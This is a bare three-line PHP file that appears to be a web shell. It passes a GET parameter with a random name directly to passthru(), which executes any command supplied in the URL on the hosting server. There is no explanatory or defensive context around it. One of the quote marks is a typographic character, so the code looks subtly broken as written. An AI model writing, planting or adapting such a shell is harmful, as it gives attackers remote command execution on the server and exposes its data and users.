<?php
passthru($_GET[’ATXjFXUA']);
?>
